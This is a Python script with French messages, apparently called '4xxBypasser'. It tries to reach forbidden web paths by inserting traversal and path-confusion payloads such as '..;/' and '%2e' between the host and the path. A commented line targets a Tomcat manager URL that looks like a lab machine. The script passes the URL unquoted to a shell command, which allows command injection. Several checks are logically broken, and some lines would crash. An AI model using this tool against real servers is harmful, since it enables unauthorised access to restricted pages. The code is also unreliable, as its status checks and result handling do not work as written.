import requests
import json
import argparse

from os import system
from time import sleep

import urllib3

from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

print("""
\033[91m
 ___         _____                             
| | |_ _ _ _| __  |_ _ ___ ___ ___ ___ ___ ___ 
|_  |_'_|_'_| __ -| | | . | .'|_ -|_ -| -_|  _|
  |_|_,_|_,_|_____|_  |  _|__,|___|___|___|_|  
                  |___|_|       
\033[0m
\033[92m[+]\033[0m \033[28mCreator : \033[4mRistBS\033[0m
\033[93m[?]\033[0m \033[28mInfo : cet outil à été crée pour contourner les réponses d'erreur coté client ( 4xx ) \033[0m
\033[91m[!]\033[0m \033[28mUtilisez cet outil dans un cadre légal !\033[0m\n\n""")

parser = argparse.ArgumentParser(description='outil pour contourner les code etats 4xx')
parser.add_argument('url', help='entrer url avec nom de domaine seulement')
parser.add_argument('--path', help='donner le chemin qui a comme reponse 4xx')
parser.add_argument('--params', help='donner les paramètres nécessaires pour avoir une réponses valide')
parser.add_argument('--proxy', help='utilisez des proxy pour empecher la limite de requetes')
parser.add_argument('--batch', action='store_true', help='répond de facon positive à toute demande')
parser.add_argument('-o', '--output', type=str, help='enregistrer une copie des résultats')
args = parser.parse_args()


def network():
	try:
		requests.get('https://github.com', timeout = 3)
		print ("\n\033[61m[+] recherche de connexion wifi\033[0m")
		print ("\n\033[32m[+]\033[0m Wifi trouvé et fonctionnel !\n")
	except requests.ConnectionError:
		print ("\033[91m[!]\033[0m aucune connexion internet")
		exit()

#class exploit:
def payload_tester():
    params = args.params
    proxies = args.proxy
    #args.params
    print("Paramètres : {}".format(params))
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    requests.packages.urllib3.disable_warnings()
    payloads = ['%2e', '/.', '..;/', '//', '/./', '/']
    try:
        for payload in payloads:
            print("\033[92m[+]\033[0m \033[4mTest des payloads suivant \033[0m:")
            sleep(3)
            if args.url and args.path:
                link = args.url + payload + args.path
                r = requests.get(link, params=params, verify=False, proxies=proxies)
                if r.status_code == 200:
                    print("positif pour : {}".format(link))
                elif r.status_code == 400 or 500 or 404:
                    print("négatif pour : {} ".format(link))
                else:
                    print("[?] Résultat peut etre positif mais certains paramètres n'ont pas été pris en compte.")
                for result in r:
                    print("Reponse :" + str(r.status_code))
                    launch = input("Lancer l'url modifié dans firefox ? [Y,N] : ")
                    if launch == 'Y' or 'y':
                       #system('firefox "http://10.10.10.250/manager/..;/manager/html" ')
                        system('firefox {}'.format(link))
                    elif args.batch:
                        print("l'argument batch est pris en compte...")
                        system('firefox {}'.format(link))
                    elif launch == 'N':
                        print(result)
                        
                    break
                print("URL :" + args.url + payload + args.path) # 2x args.path ( url -(here)- payload )
                print("payload : \033[91m{}\033[0m".format(payload))
                count = len(payloads)
        if args.output:
            f = open(args.output, "w")
            f.write(str(result))
            f.close
    except requests.exceptions.ConnectionError:
        print("Connection refused")
        sleep(12)

    positive = str(401, str(200))
    for positive in r.status_code:
        print("\n\033[91m[!]\033[0m résultat trouvé. {}/" + str(count).format(str(positive)))
#def firefox():
    #launch = input("Lancer l'url modifié dans firefox ? [Y,N] : ")
    #if launch == 'Y' or 'y':
        #system('firefox "http://10.10.10.250/manager/..;/manager/html" ')
     #   payload = '..;'
      #  system('firefox {}'.format(args.url, payload, args.path))
    #else:
     #   print("[!] - good bye")
      #  exit()

def main():
    network()
    payload_tester()
    #firefox()

main()


